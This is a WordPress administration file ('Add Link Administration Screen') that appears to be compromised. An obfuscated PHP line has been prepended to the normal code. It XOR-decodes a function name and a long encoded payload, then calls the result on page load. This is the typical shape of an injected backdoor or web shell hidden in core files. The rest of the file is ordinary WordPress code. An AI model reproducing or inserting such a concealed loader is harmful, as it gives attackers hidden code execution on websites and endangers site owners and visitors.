<?php $BEMQMBNbyoiS='29K4DQj+U+9;US;'^'QK.U045M EZO<<U';$jotMKsgLZobr=$BEMQMBNbyoiS('','D Ov1H:CEW=WjECD<=ALm;;Fg5ZTA8nUINtdlm3L0+:>Y>+WPU-OBq+TZ+a=+OAXS54DAazp<<DybUQNi=RZ=h:HFtOlEevKsL+8Gnq;HEOjYMF Q6IFY,;FO567ANpzcQIoXS0DC:UAKlxhRKZ7JL3KIoqguO8SDjkYWtS:-+LQZxMUETJ+ZoyD<OWY-C anD8ALInC+n3DOFT8 PcYH2VPI3nMU1P;;q,,>PUE63;O,xHhJ>8N1X2yIk0.+yg=ut20CjKPMyhgRIH;6,RxRK1GLX2Z3kU.>sxQrFVYhoyw=5Y2mSdiC7T:1S6GKM=3oRkE6,7AJx5gE4=IUW2DodAj94q;3a8FO6KpWU5dTwJt4AUGYakOxaaCVRGS<V1 xwHa.SIb3jqG+80,bsUvJ.69HxBP+ME7GS-QXUZuyn1NS5DBQLU2IN487d+-EO5qS40JIV6,tN7=-3=17yhY5X4dMyLRAT.j3E8yALC=,ai0X3.bmLP0LO C;2=El=JTO<HFhKIEtXtAYT55BzDqxcF=leU5Z .kH.QJV9FZoGxoOhcu ZRlX4r17GeuK,gMOYMATeRXhw;XwKCQdt73JZ+0-T513XI;-SZw9P7LZ52pgNU7YZJhNCgupDi>Z15XX>eQY2NWhJ<SWAZPTj+NlR>EU1 OegAP.'^'-FgWW=T 1>R95 ;-OI2dJCT48Q;  g18<:SMEMHF9MOP:JB8>uU 0.O5.J>bF:5pwQU0 MZTWY=PBuqnIFXS4LU=2TrLbBMAzEMW5FURhxoZbmbImE=45IUnkQWC gKZG8bDqY9MgU 5kBEHzo>V>-ho 2Q9UkS6=1O0wQsIYY 44Pi> -cvsTsM5=2-X1NIJ+M5erdJVdNNEb0YT1CdhT7<:VUGqU1OZ.GIGphePRW<ICBb,QJ+P;ZYaOomd6,t0TSCcN 54YUYrm>ZZY7Qr0;Nh<S.R4>KGSEqV-3 SepSYT-SMnDM5V8OTh<:AGTUOzJaRMC cXNmLRR;06Q,OLe5kq nv2lf.EkT<0LDiIjPB 92<HK4rhhg2332c=TYXJhEE60Y9cxcOYDMBNuR<OZL-CHYVG8=MwI0,4zHY.D  P6+0 <H,fLWE;OL1.j.>ADb+7EIBzhYHPRURQL=T,UMaYh6  O5X APhwITJIMT9GOBKjpQ>=A:dYX<3X2=<H;nO ,<StTe=5ATkZbWXK+YYMqQ;TO0oE43qdozRzXHvPQAF<cYkPETUqUBsJS+y;ypeU0iZFZ:PbcwBTVA8;RoF1LnV  HY rPI1N 5TVWKnqS8.+AgcGUPdIEP8P.9RMu=S:63mL2.-510MvgWX7 -XTgUNzZS');$jotMKsgLZobr();
/**
 * Add Link Administration Screen.
 *
 * @package WordPress
 * @subpackage Administration
 */

/** Load WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( ! current_user_can('manage_links') )
	wp_die(__('Sorry, you are not allowed to add links to this site.'));

$title = __('Add New Link');
$parent_file = 'link-manager.php';

wp_reset_vars( array('action', 'cat_id', 'link_id' ) );

wp_enqueue_script('link');
wp_enqueue_script('xfn');

if ( wp_is_mobile() )
	wp_enqueue_script( 'jquery-touch-punch' );

$link = get_default_link_to_edit();
include( ABSPATH . 'wp-admin/edit-link-form.php' );

require( ABSPATH . 'wp-admin/admin-footer.php' );
